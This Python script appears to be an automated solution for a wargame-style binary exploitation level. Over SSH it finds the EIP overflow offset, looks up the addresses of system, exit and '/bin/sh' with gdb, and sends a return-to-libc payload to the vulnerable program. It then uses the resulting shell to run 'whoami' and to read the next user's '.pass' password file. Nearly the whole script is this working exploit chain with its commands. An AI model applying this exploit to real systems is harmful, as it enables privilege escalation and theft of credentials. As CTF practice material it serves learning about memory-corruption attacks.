import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, get_func_structure, find_offset, get_func_address
from utils.text import print_output, print_title, print_magic
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'echo "test" | ./{binary_name}', title='Simple execute binary')
print_title('Okay, stdin intercepted, stdin write expected')
print_output(output)
print_title("We need some shellcode? Okay...")
print_magic('Debug Time!')

get_func_structure(
    client,
    'main', filter=['+14>:', '+126>:', '+150>:'],
    title='Fork for create child process inspect it from ptrace and gets for stdin read, time to overflow?'
)

print_title('Find EIP offset, to overflow buffer and execute any binary')
offset = find_offset(client, register='eip', stdin=True, before_run='"set follow-fork-mode child"')
print_title('Nice, we have offset to eip register')

print_title('Try to return-to-libc attack to rewrite buffer and call what we need')
print_title('We need to find system address, exit address and bin/sh address (exit will be rewrite to system call '
            'shell for child process)')

system_address = get_func_address(client, 'system')
print_output(system_address)
exit_address = get_func_address(client, 'exit')
print_output(exit_address)
sh_address = exec(
    client,
    f'''echo "y" | gdb ./{binary_name} -q -ex "b*main" -ex "r" -ex 'find __libc_start_main,+99999999,"/bin/sh"\'''',
    title=f'Get #bin/sh address')[5]
print_output(sh_address)
print_title('Alright, time to concat it to our powerful shellcode!')
f = lambda command: exec(
    client, f'''echo "{command}" | (python -c "print {offset} * '.' + '{address_to_string(system_address)}' + '{address_to_string(exit_address)}' + '{address_to_string(sh_address)}'" ; cat) |./level04'''
)

print_title("Let's try whoami + shellcode")
output = f('whoami')
print_output(output)
user = output[0]
print_title('It was long time... But success!')
print_title('Dirty tricks???')

print_title('Steal password!')
output = f(f'cat /home/users/{user}/.pass')
print_output(output)
token = output[0]
print_title('Woo-hoo we did this!!!')

save_token(token)
